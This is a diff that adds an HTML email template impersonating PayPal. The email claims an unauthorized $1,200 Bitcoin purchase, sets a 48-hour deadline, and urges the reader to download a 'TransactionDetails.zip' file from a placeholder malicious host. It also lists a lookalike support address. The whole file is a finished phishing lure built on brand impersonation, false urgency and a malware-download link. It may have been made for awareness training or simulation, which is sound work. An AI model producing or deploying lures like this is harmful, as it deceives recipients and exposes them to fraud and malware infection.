@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transaction Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 30px auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .header {
+            background-color: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .content {
+            padding: 20px;
+            color: #333333;
+            line-height: 1.6;
+        }
+        .cta {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .button {
+            background-color: #3498db;
+            color: white;
+            text-decoration: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        .button:hover {
+            background-color: #2980b9;
+        }
+        .footer {
+            background-color: #f9f9f9;
+            padding: 15px;
+            font-size: 12px;
+            text-align: center;
+            color: #888888;
+            border-top: 1px solid #dddddd;
+        }
+        .footer a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Bitcoin Purchase Confirmation</h1>
+        </div>
+        <div class="content">
+            <p>Dear Customer,</p>
+            <p>Thank you for your recent purchase of <strong>0.05 BTC</strong> using PayPal. The total amount of <strong>$1,200.00</strong> has been successfully debited from your account.</p>
+            <p>If you did not authorize this transaction or believe it to be an error, please download the attached file for further details and submit a dispute within <strong>48 hours</strong> to avoid processing the transaction.</p>
+            <div class="cta">
+                <a href="http://malicious-link.com/TransactionDetails.zip" class="button">Download Transaction Details</a>
+            </div>
+            <p>If you have any questions, please contact our customer support team at <a href="mailto:support@paypal-transactions.com">support@paypal-transactions.com</a>.</p>
+            <p>Thank you for using PayPal.</p>
+            <p>Best regards,<br>PayPal Support Team</p>
+        </div>
+        <div class="footer">
+            <p>&copy; 2024 PayPal. All rights reserved.</p>
+            <p>This email was sent to you as a notification of your recent activity. Please do not reply to this email. For support, visit <a href="http://paypal.com/support">PayPal Help Center</a>.</p>
+        </div>
+    </div>
+</body>
+</html>
